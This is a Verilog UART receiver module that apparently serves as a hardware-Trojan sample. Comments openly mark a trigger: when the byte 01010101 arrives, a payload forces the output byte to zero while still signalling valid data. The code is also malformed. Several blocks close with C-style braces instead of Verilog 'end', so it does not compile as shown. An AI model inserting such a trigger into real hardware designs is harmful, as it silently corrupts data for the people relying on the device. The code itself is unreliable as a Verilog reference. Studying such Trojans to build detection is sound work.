 module uart_rx (
    input clk,
    input rx_serial,
    output reg tx_flag = 1'b0,
    output reg [7:0] tx_byte = 8'd0
);

    reg [5:0] serial = 6'b111111;
    reg [3:0] counter = 4'd0;
    reg [3:0] state = 4'd0;
    reg [8:0] partial_byte = 9'd0;

    // Trojan activation condition: Detect a specific bit pattern.
    wire trojan_trigger = (partial_byte[7:0] == 8'b01010101);

    // Detectors
    wire start_detect = serial[5] & serial[4] & serial[3] & ~serial[2];
    wire one_detect = serial[5] & serial[4] & serial[3];
    wire zero_detect = ~serial[5] & ~serial[4] & ~serial[3];

    always @ (posedge clk) begin
        serial <= {serial[4:0], rx_serial};
        counter <= counter + 4'd1;

        if (tx_flag)
            tx_flag <= 1'b0;

        if (state == 4'd0) begin
            if (start_detect) begin
                state <= 4'd1;
                counter <= 4'd0;
            end
        } else if (counter == 4'd9) begin
            state <= state + 4'd1;
            partial_byte <= {one_detect, partial_byte[8:1]};

            if (~one_detect & ~zero_detect || (state == 4'd1 & ~zero_detect)) // Noise error or start bit error
                state <= 4'd0;
        } else if (state == 4'd11) begin
            if (trojan_trigger) begin
                // Trojan payload: Override the data and raise flag
                tx_byte <= 8'b00000000; // Example payload: force all zeros
                tx_flag <= 1'b1;
                state <= 4'd0;
            end else if (partial_byte[8]) begin // Normal operation
                tx_flag <= 1'b1;
                tx_byte <= partial_byte[7:0];
                state <= 4'd0;
            end
        end
    end
endmodule
